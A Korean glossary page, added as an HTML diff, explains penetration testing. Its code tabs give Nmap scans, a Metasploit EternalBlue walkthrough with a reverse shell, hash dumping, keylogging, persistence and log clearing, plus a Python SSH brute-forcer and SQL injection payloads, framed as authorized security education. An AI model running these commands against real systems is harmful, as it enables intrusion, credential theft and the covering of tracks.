@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing (침투 테스트) | KAITRUST AI 백과사전</title>
+    <meta name="description" content="Penetration Testing(침투 테스트)은 시스템의 보안 취약점을 찾기 위해 실제 공격자의 관점에서 수행하는 합법적인 해킹 테스트입니다. 화이트박스, 블랙박스, 그레이박스 방식이 있습니다.">
+    <meta name="keywords" content="Penetration Testing, 침투 테스트, 펜테스트, Pentest, 화이트햇 해킹, 취약점 진단, 보안 테스트, Red Team, Kali Linux, KAITRUST">
+    <link rel="canonical" href="https://glossary.kaitrust.ai/ko/term/Penetration%20Testing/">
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://glossary.kaitrust.ai/ko/term/Penetration%20Testing/">
+    <meta property="og:title" content="Penetration Testing (침투 테스트) | KAITRUST AI 백과사전">
+    <meta property="og:description" content="시스템의 보안 취약점을 찾기 위해 실제 공격자 관점에서 수행하는 합법적인 해킹 테스트. 화이트박스, 블랙박스, 그레이박스 방식.">
+    <meta property="og:image" content="https://kaitrust.ai/images/og-glossary.png">
+    <meta property="og:locale" content="ko_KR">
+    <meta property="og:site_name" content="KAITRUST AI 백과사전">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Penetration Testing (침투 테스트) | KAITRUST AI 백과사전">
+    <meta name="twitter:description" content="시스템의 보안 취약점을 찾기 위해 실제 공격자 관점에서 수행하는 합법적인 해킹 테스트. 화이트박스, 블랙박스, 그레이박스 방식.">
+    <meta name="twitter:image" content="https://kaitrust.ai/images/og-glossary.png">
+
+    <!-- Structured Data (JSON-LD) -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "DefinedTerm",
+        "name": "Penetration Testing",
+        "alternateName": "침투 테스트",
+        "description": "시스템의 보안 취약점을 찾기 위해 실제 공격자의 관점에서 수행하는 합법적인 해킹 테스트입니다. 화이트박스, 블랙박스, 그레이박스 방식이 있습니다.",
+        "inDefinedTermSet": {
+            "@type": "DefinedTermSet",
+            "name": "KAITRUST AI 백과사전",
+            "url": "https://glossary.kaitrust.ai/"
+        }
+    }
+    </script>
+
+    <link rel="icon" type="image/png" href="https://kaitrust.ai/favicon.png">
+    <link rel="apple-touch-icon" href="https://kaitrust.ai/favicon.png">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&family=Noto+Sans+KR:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <!-- Common CSS -->
+    <link rel="stylesheet" href="/css/kaitrust-common.css">
+    <link rel="stylesheet" href="/css/light-mode.css">
+    <link rel="stylesheet" href="/components/ask-ai/kaitrust-ai-modal.css">
+
+    <style>
+        /* 고도화 섹션 스타일 */
+        .term-section {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(168, 85, 247, 0.1);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-bottom: 1.5rem;
+        }
+        .section-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #f1f5f9;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 1px solid rgba(168, 85, 247, 0.2);
+        }
+        .section-content p {
+            color: #cbd5e1;
+            line-height: 1.8;
+            margin-bottom: 1rem;
+        }
+        .section-content p:last-child { margin-bottom: 0; }
+
+        /* 코드 블록 */
+        .code-tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        .code-tab {
+            padding: 0.5rem 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #94a3b8;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .code-tab.active {
+            background: rgba(168, 85, 247, 0.2);
+            border-color: #a855f7;
+            color: #a855f7;
+        }
+        .code-block {
+            position: relative;
+            background: #0f172a;
+            border-radius: 12px;
+            overflow: hidden;
+            display: none;
+        }
+        .code-block.active { display: block; }
+        .code-block pre {
+            padding: 1.5rem;
+            margin: 0;
+            overflow-x: auto;
+        }
+        .code-block code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: #e2e8f0;
+            line-height: 1.6;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 0.75rem;
+            right: 0.75rem;
+            padding: 0.5rem 1rem;
+            background: rgba(168, 85, 247, 0.3);
+            border: none;
+            border-radius: 6px;
+            color: #e2e8f0;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+        .copy-btn:hover { background: rgba(168, 85, 247, 0.5); }
+
+        /* 대화 예시 */
+        .conversation-examples { display: flex; flex-direction: column; gap: 1.5rem; }
+        .conv-item {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 1.25rem;
+        }
+        .conv-context {
+            font-size: 0.9rem;
+            color: #a855f7;
+            font-weight: 500;
+            margin-bottom: 0.75rem;
+        }
+        .conv-quote {
+            color: #e2e8f0;
+            font-style: italic;
+            line-height: 1.7;
+            margin: 0;
+            padding-left: 1rem;
+            border-left: 3px solid #a855f7;
+        }
+
+        /* 주의사항 */
+        .warning-list { display: flex; flex-direction: column; gap: 1rem; }
+        .warning-item {
+            display: flex;
+            gap: 1rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+        }
+        .warning-icon { font-size: 1.5rem; }
+        .warning-item strong { color: #f1f5f9; display: block; margin-bottom: 0.25rem; }
+        .warning-item p { color: #94a3b8; margin: 0; font-size: 0.95rem; }
+
+        /* 관련 용어 */
+        .related-terms { display: flex; flex-wrap: wrap; gap: 0.75rem; }
+        .related-term-link {
+            padding: 0.5rem 1rem;
+            background: rgba(168, 85, 247, 0.1);
+            border: 1px solid rgba(168, 85, 247, 0.3);
+            border-radius: 20px;
+            color: #a855f7;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+        .related-term-link:hover {
+            background: rgba(168, 85, 247, 0.2);
+            transform: translateY(-2px);
+        }
+
+        /* 더 배우기 */
+        .learn-more { display: flex; flex-direction: column; gap: 0.75rem; }
+        .learn-link {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            color: #00f5ff;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+        .learn-link:hover { background: rgba(0, 0, 0, 0.3); transform: translateX(5px); }
+
+        .term-detail-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 120px 2rem 4rem;
+            position: relative;
+            z-index: 1;
+        }
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+            flex-wrap: wrap;
+        }
+        .breadcrumb a {
+            color: #64748b;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .breadcrumb a:hover { color: var(--primary); }
+        .breadcrumb span { color: #64748b; }
+        .breadcrumb .current { color: var(--accent); font-weight: 500; }
+        .term-detail-header {
+            background: linear-gradient(145deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.6));
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            border-radius: 24px;
+            padding: 3rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .term-category-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: rgba(168, 85, 247, 0.2);
+            border-radius: 20px;
+            font-size: 0.85rem;
+            color: #a855f7;
+            margin-bottom: 1rem;
+        }
+        .term-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #ffffff, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .term-english {
+            font-size: 1.2rem;
+            color: #94a3b8;
+            margin-bottom: 1.5rem;
+        }
+        .term-description {
+            font-size: 1.1rem;
+            line-height: 1.8;
+            color: #e2e8f0;
+        }
+        .term-actions {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+            flex-wrap: wrap;
+        }
+        .term-action-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            border-radius: 12px;
+            font-size: 0.9rem;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #a855f7, #6366f1);
+            color: white;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(168, 85, 247, 0.3);
+        }
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: #e2e8f0;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        @media (max-width: 768px) {
+            .term-detail-container { padding: 100px 1rem 2rem; }
+            .term-detail-header { padding: 2rem 1.5rem; }
+            .term-title { font-size: 1.8rem; }
+        }
+    </style>
+    <link rel="stylesheet" href="/glossary/css/term-sections.css">
+
+</head>
+<body>
+    <!-- Particle Background -->
+    <div class="particle-container" id="particles"></div>
+
+    <!-- Header -->
+    <header>
+        <div class="header-content">
+            <a href="https://kaitrust.ai" class="logo" style="text-decoration: none;">
+                <img src="https://kaitrust.ai/favicon.png" alt="KAITRUST" class="logo-icon">
+                <div>
+                    <div class="logo-text">KAITRUST</div>
+                    <div class="logo-sub">AI 백과사전</div>
+                </div>
+            </a>
+            <nav>
+                <div class="nav-dropdown">
+                    <a href="https://kaitrust.ai/about/" class="nav-dropdown-trigger">협회소개 <span class="dropdown-arrow">▼</span></a>
+                    <div class="nav-dropdown-menu">
+                        <a href="https://kaitrust.ai/about/greeting/">인사말</a>
+                        <a href="https://kaitrust.ai/about/history/">연혁</a>
+                        <a href="https://kaitrust.ai/about/organization/">조직도</a>
+                        <a href="https://kaitrust.ai/about/articles/">정관</a>
+                        <a href="https://kaitrust.ai/about/location/">오시는 길</a>
+                        <a href="https://kaitrust.ai/about/ci/">CI/BI</a>
+                    </div>
+                </div>
+                <a href="https://consulting.kaitrust.ai" class="nav-consulting">컨설팅 신청</a>
+                <a href="https://expert.kaitrust.ai" class="nav-highlight">전문위원 모집</a>
+                <a href="https://glossary.kaitrust.ai" class="nav-highlight nav-glossary">AI 백과사전</a>
+                <a href="https://wiastandards.com" class="nav-external">WIA Standards</a>
+                <a href="https://login.kaitrust.ai" class="nav-login">로그인</a>
+                <button class="nav-lang" aria-label="언어 선택">🌐</button>
+            </nav>
+        </div>
+    </header>
+
+    <main class="term-detail-container">
+        <!-- Breadcrumb -->
+        <nav class="breadcrumb" aria-label="Breadcrumb">
+            <a href="https://kaitrust.ai">홈</a>
+            <span>›</span>
+            <a href="https://glossary.kaitrust.ai">AI 백과사전</a>
+            <span>›</span>
+            <a href="https://glossary.kaitrust.ai/#security">보안</a>
+            <span>›</span>
+            <span class="current">Penetration Testing</span>
+        </nav>
+
+        <!-- Term Header -->
+        <article class="term-detail-header">
+            <div class="term-category-badge">
+                <span>🔒</span>
+                <span>보안</span>
+            </div>
+            <h1 class="term-title">Penetration Testing</h1>
+            <p class="term-english">침투 테스트 (펜테스트, Pentest)</p>
+            <div class="term-description">
+                <p>시스템, 네트워크, 애플리케이션의 보안 취약점을 찾기 위해 실제 공격자의 관점에서 수행하는 합법적인 해킹 테스트입니다. "모의 해킹"이라고도 하며, 화이트박스(전체 정보 공개), 블랙박스(정보 없음), 그레이박스(일부 정보) 방식으로 진행됩니다.</p>
+            </div>
+            <div class="term-actions">
+                <a href="https://glossary.kaitrust.ai" class="term-action-btn btn-primary">
+                    📚 전체 용어 보기
+                </a>
+                <a href="https://glossary.kaitrust.ai/#security" class="term-action-btn btn-secondary">
+                    🔒 보안 더보기
+                </a>
+            </div>
+        </article>
+
+        <!-- 상세 설명 -->
+        <section class="term-section">
+            <h2 class="section-title">📖 상세 설명</h2>
+            <div class="section-content">
+                <p>Penetration Testing(침투 테스트, 펜테스트)은 조직의 보안 상태를 평가하기 위해 실제 해커가 사용하는 기법과 도구로 시스템을 공격해보는 보안 평가 방법입니다. 단순한 취약점 스캐닝과 달리, 침투 테스터(펜테스터)는 발견된 취약점을 실제로 악용(exploit)하여 어디까지 침투할 수 있는지 확인합니다. 이를 통해 조직은 실제 공격 시나리오에서의 위험을 파악하고 대응할 수 있습니다.</p>
+                <p>침투 테스트는 테스터에게 제공되는 정보 수준에 따라 세 가지로 분류됩니다. 블랙박스(Black Box) 테스트는 외부 공격자처럼 시스템에 대한 정보 없이 진행합니다. 화이트박스(White Box) 테스트는 소스 코드, 아키텍처 문서, 자격 증명 등 모든 정보를 제공받아 깊이 있는 분석을 수행합니다. 그레이박스(Gray Box) 테스트는 일부 정보(예: 일반 사용자 계정)만 제공받아 내부자 위협 시나리오를 시뮬레이션합니다.</p>
+                <p>침투 테스트 프로세스는 일반적으로 5단계로 진행됩니다. 정찰(Reconnaissance) 단계에서 대상에 대한 정보를 수집하고, 스캐닝(Scanning)에서 취약점을 탐지합니다. 익스플로잇(Exploitation) 단계에서 취약점을 실제로 악용하고, 포스트 익스플로잇(Post-Exploitation)에서 권한 상승, 횡적 이동, 데이터 탈취 등을 시도합니다. 마지막으로 보고서(Reporting) 단계에서 발견 사항과 개선 권고안을 문서화합니다.</p>
+                <p>침투 테스트는 규정 준수(PCI-DSS, HIPAA, SOC 2 등)와 보안 성숙도 향상에 필수적입니다. Red Team 연습은 침투 테스트의 확장된 형태로, 더 긴 기간 동안 은밀하게 공격을 수행하여 조직의 탐지 및 대응 능력(Blue Team)을 평가합니다. Purple Team은 Red Team과 Blue Team이 협력하여 보안을 개선하는 접근법입니다. 클라우드, 컨테이너, API, IoT 등 새로운 기술 영역에 대한 침투 테스트 수요도 증가하고 있습니다.</p>
+            </div>
+        </section>
+
+        <!-- 코드 예제 -->
+        <section class="term-section">
+            <h2 class="section-title">💻 코드 예제</h2>
+            <div class="code-tabs">
+                <button class="code-tab active" data-lang="nmap">Nmap 스캐닝</button>
+                <button class="code-tab" data-lang="metasploit">Metasploit</button>
+                <button class="code-tab" data-lang="python">Python 자동화</button>
+            </div>
+            <div class="code-block active" data-lang="nmap">
+                <pre><code class="language-bash"># Nmap - 네트워크 정찰 및 포트 스캐닝
+# 침투 테스트의 첫 단계: 대상 시스템 정보 수집
+
+# 1. 기본 포트 스캔 (상위 1000개 포트)
+nmap 192.168.1.100
+
+# 2. 전체 포트 스캔 + 서비스 버전 탐지
+nmap -p- -sV 192.168.1.100
+# -p-: 모든 65535 포트 스캔
+# -sV: 서비스 버전 탐지
+
+# 3. OS 탐지 + 스크립트 스캔 (공격적 스캔)
+sudo nmap -A -T4 192.168.1.100
+# -A: OS 탐지, 버전 탐지, 스크립트 스캔, traceroute
+# -T4: 빠른 스캔 (0-5, 높을수록 빠름)
+
+# 4. 취약점 스크립트 스캔
+nmap --script vuln 192.168.1.100
+# NSE 취약점 스크립트 실행
+
+# 5. 특정 취약점 스캔 (예: SMB 취약점)
+nmap --script smb-vuln-* -p 445 192.168.1.0/24
+# MS17-010 (EternalBlue) 등 SMB 취약점 탐지
+
+# 6. 웹 서버 열거
+nmap --script http-enum -p 80,443 192.168.1.100
+# 디렉토리, 파일, 웹 앱 탐지
+
+# 7. 스텔스 스캔 (SYN 스캔)
+sudo nmap -sS -Pn 192.168.1.100
+# -sS: SYN 스캔 (연결 완료 안 함)
+# -Pn: 핑 스킵 (방화벽 우회)
+
+# 8. UDP 서비스 스캔
+sudo nmap -sU --top-ports 100 192.168.1.100
+# DNS(53), SNMP(161), DHCP(67) 등
+
+# 9. 결과를 여러 형식으로 저장
+nmap -A 192.168.1.100 -oA scan_results
+# scan_results.nmap (일반), .xml, .gnmap (greppable)
+
+# 10. 서브넷 전체 호스트 발견
+nmap -sn 192.168.1.0/24
+# 핑 스캔으로 활성 호스트 발견
+
+# 실제 침투 테스트 시나리오 예제
+# 1단계: 호스트 발견
+nmap -sn 10.0.0.0/24 -oG - | grep "Up" | cut -d " " -f 2 > live_hosts.txt
+
+# 2단계: 서비스 스캔
+nmap -sV -iL live_hosts.txt -oA services
+
+# 3단계: 취약점 스캔
+nmap --script vuln -iL live_hosts.txt -oA vulns</code></pre>
+                <button class="copy-btn" onclick="copyCode(this)">📋 복사</button>
+            </div>
+            <div class="code-block" data-lang="metasploit">
+                
+                <pre><code class="language-bash"># Metasploit Framework - 익스플로잇 프레임워크
+# 취약점을 실제로 악용하여 침투 테스트 수행
+
+# Metasploit 콘솔 시작
+msfconsole
+
+# 1. 취약점 검색
+msf6 > search eternalblue
+msf6 > search type:exploit name:apache
+msf6 > search cve:2021-44228  # Log4Shell
+
+# 2. 익스플로잇 모듈 선택 및 설정
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > show options
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
+
+# 3. 페이로드 선택
+msf6 exploit(ms17_010_eternalblue) > show payloads
+msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+
+# 4. 익스플로잇 실행
+msf6 exploit(ms17_010_eternalblue) > exploit
+# 또는
+msf6 exploit(ms17_010_eternalblue) > run
+
+# 5. Meterpreter 세션에서의 포스트 익스플로잇
+meterpreter > sysinfo                    # 시스템 정보
+meterpreter > getuid                     # 현재 사용자
+meterpreter > getsystem                  # 권한 상승 시도
+meterpreter > hashdump                   # 비밀번호 해시 덤프
+meterpreter > shell                      # 시스템 셸 획득
+meterpreter > upload /local/file /remote # 파일 업로드
+meterpreter > download /remote/file      # 파일 다운로드
+meterpreter > screenshot                 # 스크린샷 캡처
+meterpreter > keyscan_start              # 키로거 시작
+
+# 6. 권한 상승 모듈
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 post(local_exploit_suggester) > set SESSION 1
+msf6 post(local_exploit_suggester) > run
+
+# 7. 횡적 이동 (Lateral Movement)
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.101
+# 내부 RDP 포트 포워딩
+
+# 8. 지속성 유지 (Persistence)
+meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.50
+# 재부팅 후에도 연결 유지
+
+# 9. 흔적 삭제
+meterpreter > clearev                    # 이벤트 로그 삭제
+meterpreter > timestomp -m "01/01/2020 12:00:00" file.txt
+
+# 웹 애플리케이션 테스트
+msf6 > use auxiliary/scanner/http/dir_scanner
+msf6 > use auxiliary/scanner/http/http_login
+msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec  # Shellshock</code></pre>
+                <button class="copy-btn" onclick="copyCode(this)">📋 복사</button>
+            </div>
+            <div class="code-block" data-lang="python">
+                
+                <pre><code class="language-python"># Python 침투 테스트 자동화 스크립트
+
+import socket
+import subprocess
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import paramiko
+import ftplib
+
+# 1. 포트 스캐너
+def scan_port(host, port):
+    """단일 포트 스캔"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex((host, port))
+    sock.close()
+    return port if result == 0 else None
+
+def scan_ports(host, ports=range(1, 1025)):
+    """멀티스레드 포트 스캔"""
+    open_ports = []
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        results = executor.map(lambda p: scan_port(host, p), ports)
+        open_ports = [p for p in results if p]
+    return open_ports
+
+# 사용 예
+# open_ports = scan_ports("192.168.1.100")
+# print(f"Open ports: {open_ports}")
+
+
+# 2. SSH 브루트포스 (교육 목적, 허가된 테스트에서만 사용)
+def ssh_bruteforce(host, username, password_list):
+    """SSH 비밀번호 브루트포스"""
+    for password in password_list:
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(host, username=username, password=password, timeout=3)
+            print(f"[SUCCESS] {username}:{password}")
+            ssh.close()
+            return password
+        except paramiko.AuthenticationException:
+            print(f"[FAILED] {username}:{password}")
+        except Exception as e:
+            print(f"[ERROR] {e}")
+            break
+    return None
+
+
+# 3. 웹 디렉토리 열거
+def dir_bruteforce(base_url, wordlist):
+    """웹 디렉토리 브루트포스"""
+    found = []
+    headers = {'User-Agent': 'Mozilla/5.0 (compatible; PenTest)'}
+
+    for word in wordlist:
+        url = f"{base_url}/{word}"
+        try:
+            response = requests.get(url, headers=headers, timeout=5)
+            if response.status_code == 200:
+                print(f"[FOUND] {url}")
+                found.append(url)
+            elif response.status_code == 403:
+                print(f"[FORBIDDEN] {url}")
+        except requests.RequestException:
+            pass
+
+    return found
+
+# 사용 예
+# wordlist = ['admin', 'login', 'dashboard', 'api', 'config']
+# found_dirs = dir_bruteforce("https://example.com", wordlist)
+
+
+# 4. SQL Injection 테스터
+def test_sqli(url, param):
+    """기본 SQL Injection 테스트"""
+    payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR '1'='1' /*",
+        "1' AND '1'='1",
+        "1; DROP TABLE users--",
+        "' UNION SELECT NULL,NULL,NULL--",
+    ]
+
+    vulnerable = []
+    for payload in payloads:
+        test_url = f"{url}?{param}={payload}"
+        try:
+            response = requests.get(test_url, timeout=5)
+            # 에러 메시지나 비정상 응답 확인
+            if any(err in response.text.lower() for err in
+                   ['sql', 'syntax', 'mysql', 'postgresql', 'oracle']):
+                print(f"[POSSIBLE SQLI] {payload}")
+                vulnerable.append(payload)
+        except:
+            pass
+
+    return vulnerable
+
+
+# 5. 간단한 보고서 생성
+def generate_report(host, open_ports, vulnerabilities):
+    """침투 테스트 보고서 생성"""
+    report = f"""
+    ============================================
+    PENETRATION TEST REPORT
+    ============================================
+    Target: {host}
+    Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+    OPEN PORTS:
+    -----------
+    {', '.join(map(str, open_ports))}
+
+    VULNERABILITIES FOUND:
+    ----------------------
+    """
+
+    for vuln in vulnerabilities:
+        report += f"- {vuln['type']}: {vuln['description']}\n"
+        report += f"  Severity: {vuln['severity']}\n"
+        report += f"  Recommendation: {vuln['recommendation']}\n\n"
+
+    return report
+
+
+# 6. 자동화된 침투 테스트 워크플로우
+def run_pentest(target):
+    """자동화된 기본 침투 테스트"""
+    print(f"[*] Starting pentest on {target}")
+
+    # 1단계: 포트 스캔
+    print("[*] Phase 1: Port Scanning")
+    open_ports = scan_ports(target)
+    print(f"[+] Open ports: {open_ports}")
+
+    # 2단계: 서비스 식별 (Nmap 호출)
+    print("[*] Phase 2: Service Enumeration")
+    nmap_result = subprocess.run(
+        ['nmap', '-sV', '-p', ','.join(map(str, open_ports)), target],
+        capture_output=True, text=True
+    )
+    print(nmap_result.stdout)
+
+    # 3단계: 웹 서비스 테스트 (80, 443 포트)
+    if 80 in open_ports or 443 in open_ports:
+        print("[*] Phase 3: Web Application Testing")
+        protocol = "https" if 443 in open_ports else "http"
+        base_url = f"{protocol}://{target}"
+        # 디렉토리 열거, SQLi 테스트 등
+
+    return open_ports
+
+# 주의: 이 스크립트는 교육 목적이며,
+# 반드시 서면 허가를 받은 대상에서만 사용해야 합니다.</code></pre>
+                <button class="copy-btn" onclick="copyCode(this)">📋 복사</button>
+            </div>
+        </section>
+
+        <!-- 실무 대화 예시 -->
+        <section class="term-section">
+            <h2 class="section-title">🗣️ 실무에서 이렇게 말하세요</h2>
+            <div class="conversation-examples">
+                <div class="conv-item">
+                    <div class="conv-context">💬 보안 평가 계획 회의에서</div>
+                    <blockquote class="conv-quote">
+                        "이번 분기에 외부 블랙박스 침투 테스트를 진행합니다. 인터넷에 노출된 모든 자산을 대상으로 공격자 관점에서 테스트하고, 내부 그레이박스 테스트로 일반 직원 계정이 탈취됐을 때의 위험도 평가합니다. 크리티컬 시스템은 별도로 화이트박스 테스트를 진행해서 소스 코드 레벨까지 확인할 예정입니다."
+                    </blockquote>
+                </div>
+                <div class="conv-item">
+                    <div class="conv-context">💬 침투 테스트 결과 보고에서</div>
+                    <blockquote class="conv-quote">
+                        "테스트 결과 총 23개 취약점을 발견했습니다. 크리티컬 2개, 하이 5개입니다. 가장 심각한 건 VPN 서버의 CVE-2021-22986으로, 실제로 익스플로잇하여 내부 네트워크 접근에 성공했습니다. 이후 횡적 이동으로 도메인 컨트롤러 관리자 권한까지 획득했습니다. 즉시 패치와 네트워크 세그먼테이션 강화가 필요합니다."
+                    </blockquote>
+                </div>
+                <div class="conv-item">
+                    <div class="conv-context">💬 Red Team 연습 디브리핑에서</div>
+                    <blockquote class="conv-quote">
+                        "이번 Red Team 연습에서 초기 접근까지 72시간이 걸렸습니다. 피싱 이메일로 직원 한 명의 자격 증명을 획득했고, 이후 2주에 걸쳐 탐지되지 않고 민감 데이터 접근에 성공했습니다. Blue Team은 C2 통신을 탐지하지 못했는데, DNS 터널링을 사용했기 때문입니다. Purple Team 세션에서 탐지 규칙 개선 방안을 논의합시다."
+                    </blockquote>
+                </div>
+            </div>
+        </section>
+
+        <!-- 주의사항 -->
+        <section class="term-section">
+            <h2 class="section-title">⚠️ 주의사항 & 베스트 프랙티스</h2>
+            <div class="warning-list">
+                <div class="warning-item">
+                    <span class="warning-icon">❌</span>
+                    <div>
+                        <strong>허가 없는 테스트 수행</strong>
+                        <p>반드시 서면 허가(Rules of Engagement, RoE)를 받은 후 테스트해야 합니다. 허가 없는 침투 테스트는 불법이며, 컴퓨터 범죄로 처벌받을 수 있습니다. 테스트 범위, 시간, 금지 행위를 명확히 문서화하세요.</p>
+                    </div>
+                </div>
+                <div class="warning-item">
+                    <span class="warning-icon">❌</span>
+                    <div>
+                        <strong>프로덕션 환경에서 위험한 익스플로잇 실행</strong>
+                        <p>DoS 공격, 데이터 삭제, 시스템 크래시를 유발할 수 있는 익스플로잇은 신중하게 사용해야 합니다. 가능하면 테스트 환경에서 먼저 검증하고, 프로덕션에서는 비파괴적인 PoC(Proof of Concept)만 사용하세요.</p>
+                    </div>
+                </div>
+                <div class="warning-item">
+                    <span class="warning-icon">❌</span>
+                    <div>
+                        <strong>취약점 스캐닝과 침투 테스트 혼동</strong>
+                        <p>Nessus, Qualys 같은 취약점 스캐너 결과를 침투 테스트 결과로 제시하면 안 됩니다. 스캐닝은 잠재적 취약점을 탐지하고, 침투 테스트는 실제로 악용 가능한지 검증합니다. 둘 다 필요하지만 목적이 다릅니다.</p>
+                    </div>
+                </div>
+                <div class="warning-item">
+                    <span class="warning-icon">✅</span>
+                    <div>
+                        <strong>침투 테스트 베스트 프랙티스</strong>
+                        <p>PTES(Penetration Testing Execution Standard)나 OWASP Testing Guide를 따라 체계적으로 테스트하세요. 모든 행위를 상세히 기록하고, 발견 즉시 크리티컬 취약점은 보고합니다. 테스트 후 모든 백도어, 계정, 파일을 제거하고 원상 복구하세요. 정기적인 침투 테스트(최소 연 1회)와 주요 변경 후 테스트를 권장합니다.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 관련 용어 -->
+        <section class="term-section">
+            <h2 class="section-title">🔗 관련 용어</h2>
+            <div class="related-terms">
+                <a href="/ko/term/OWASP/" class="related-term-link">OWASP</a>
+                <a href="/ko/term/Vulnerability%20Scanning/" class="related-term-link">Vulnerability Scanning</a>
+                <a href="/ko/term/Red%20Team/" class="related-term-link">Red Team</a>
+                <a href="/ko/term/CVE/" class="related-term-link">CVE</a>
+                <a href="/ko/term/Zero-Day/" class="related-term-link">Zero-Day</a>
+                <a href="/ko/term/Social%20Engineering/" class="related-term-link">Social Engineering</a>
+            </div>
+        </section>
+
+        <!-- 더 배우기 -->
+        <section class="term-section">
+            <h2 class="section-title">📚 더 배우기</h2>
+            <div class="learn-more">
+                <a href="https://www.kali.org/" target="_blank" class="learn-link">
+                    🐉 Kali Linux - 침투 테스트 전용 배포판
+                </a>
+                <a href="https://www.metasploit.com/" target="_blank" class="learn-link">
+                    💀 Metasploit Framework - 익스플로잇 프레임워크
+                </a>
+                <a href="http://www.pentest-standard.org/" target="_blank" class="learn-link">
+                    📋 PTES - 침투 테스트 실행 표준
+                </a>
+                <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" class="learn-link">
+                    📘 OWASP Testing Guide - 웹 보안 테스트 가이드
+                </a>
+                <a href="https://www.hackthebox.com/" target="_blank" class="learn-link">
+                    🎮 HackTheBox - 침투 테스트 연습 플랫폼
+                </a>
+                <a href="https://portswigger.net/web-security" target="_blank" class="learn-link">
+                    🔧 PortSwigger Web Security Academy - 웹 보안 학습
+                </a>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer style="background: #1e293b !important; color: #e2e8f0 !important; padding: 3rem 0;">
+        <div style="max-width: 1200px; margin: 0 auto; padding: 0 2rem; text-align: center;">
+            <p style="color: #94a3b8;">© <span id="currentYear"></span> 한국인공지능진흥협회 (KAITRUST)</p>
+            <p style="color: #64748b; font-size: 0.85rem; margin-top: 0.5rem;">
+                <a href="https://kaitrust.ai" style="color: #00f5ff;">kaitrust.ai</a> |
+                <a href="mailto:contact@kaitrust.ai" style="color: #00f5ff;">contact@kaitrust.ai</a>
+            </p>
+        </div>
+    </footer>
+
